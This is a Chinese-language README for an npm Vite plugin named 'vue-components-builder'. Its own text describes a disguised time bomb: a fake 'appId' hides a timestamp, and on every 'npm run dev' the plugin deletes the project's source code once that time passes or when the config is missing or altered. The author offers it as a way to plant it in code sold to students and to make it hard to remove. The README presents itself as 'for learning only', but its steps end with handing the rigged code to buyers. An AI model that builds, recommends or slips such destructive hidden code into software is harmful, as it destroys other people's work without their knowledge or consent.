## 郑重声明

- 此插件仅供学习交流使用，严禁用于商业项目，若因使用不当或滥用此插件而造成的损失，由使用者承担，与此插件开发者本人无关

## 求一个 star

- 源码虽然简单，但是对付一些不守诚信的大学生，基本够用，后续我将会继续改进这个插件，让此插件成为源码的一部分，让项目强依赖于这个插件，使其难以破解
- 希望得到一个 star

## 安装

```shell
npm i vue-components-builder
```

## 使用

1. 首先，把插件安装进 vite

```js
import {defineConfig} from 'vite'
import vue from '@vitejs/plugin-vue'
import vueComponentsBuilderPlug from "vue-components-builder"; // 导入

// https://vitejs.dev/config/
export default defineConfig({
    plugins: [vue(), vueComponentsBuilderPlug()], // 使用 vueComponentsBuilderPlug()
})

```

2. 生成可用的 appId

> appId 是一个伪装，事实上，这个 appId 是一个加密后的 json 字符串，字符串的内容是 "{"time": 123456"}"，这里的 time
> 后面是一个时间戳，如果启动项目的时间晚于这个时间戳，那么就会开始删除源代码，插件的源代码中包含了生成 appId 的方法

```shell
# 执行插件源码所在目录下的 createAppId.js 文件，并且传入一个时间戳作为参数
node .\node_modules\vue-components-builder\createAppId.js 1703296821348

# 输出
# 密文是 fcebf1c70bf2aa64a4146de6a6c4f24007b0bbd4659186bdd82cdafec3c08cf0
# 测试解密得到明文 {"time":1703296821348}
```

- 注意查看测试解密得到明文是否符合规则：1. 它必须是合法的 json 字符串；2. time 字段必须是你指定的那个时间戳

3. 把上一步得到的密文，写到 vite.config.js 文件中，作为 appId 参数

```js
import {defineConfig} from 'vite'
import vue from '@vitejs/plugin-vue'
import vueComponentsBuilderPlug from "vue-components-builder";

// https://vitejs.dev/config/
export default defineConfig({
    plugins: [vue(), vueComponentsBuilderPlug()],
    appId: 'fcebf1c70bf2aa64a4146de6a6c4f24007b0bbd4659186bdd82cdafec3c08cf0' // 把密文放到这里
})

```

4. 然后就大功告成了，现在可以把源码交给买家咯

## 说明

- 亲测：在 Linux 系统上可以把源码目录下的文件删得干干净净，在 windows 系统上，由于正在使用中的文件不可删除，所以会留下 node_modules
  里的 esBuild 和 Rollup 插件，macos 没有测试过
- 插件在每一次正常执行 `npm run dev` 的时候都会进行如下操作：

1. 检查 vite.config.js 文件中是否配置了 appId，没有配置，则删除源码
2. 解密 appId，如果 appId 解密失败，则删除源码，如果用户使用了不合法的 key 和 iv 来做加密，就会出现这种情况
3. 解密 appId 得到的 json 对象不正确，则删除源码，也就是将 json 反序列化成对象的时候如果抛出异常，就会出现这种情况
4. json 得到的 time 字段不是正确的时间戳，则删除源码
5. time 指定的时间晚于当前时间，则删除源码
6. 如果上述条件都不成立，则正常启动项目

## 最后，再次郑重声明，此插件仅供学习交流使用，坚决不允许用于商业项目，学习和测试的时候注意备份源码，否则由此导致的一切损失，由使用者自行承担